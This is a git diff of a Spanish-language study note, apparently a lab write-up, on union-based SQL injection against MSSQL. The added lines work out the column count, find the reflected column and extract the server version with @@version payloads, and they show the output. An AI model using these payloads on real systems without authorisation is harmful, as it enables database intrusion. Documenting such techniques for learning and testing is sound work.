@@ -111,10 +111,25 @@ Podemos probar identificando el numero de columnas usando
 'union select 1--
 ```
 
-Hasta que se nso muestre algo diferente por pantalla en este caso se ha identificado hasta la columna numero 6
+Hasta que se nos muestre algo diferente por pantalla en este caso se ha identificado hasta la columna numero 6
 ```sql
-'union select 1,2,3,4,5
+'union select 1,2,3,4,5,6--
 ```
+
+Observamos que modificando las columnas podemos ver resultados por pantalla en este caso la columna numero 2 al ser modifica y por ejemplo introducir otro numero como un 9 se nos muestra en pantalla
+```sql
+'union select 1,9,3,4,5,6--
+```
+
+Pudiendo sacar la versión del servicio MSSQL
+```sql
+'union select 1,@@version,3,4,5,6--
+```
+
+```ad-info
+##### Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
+```
+
 
 
 
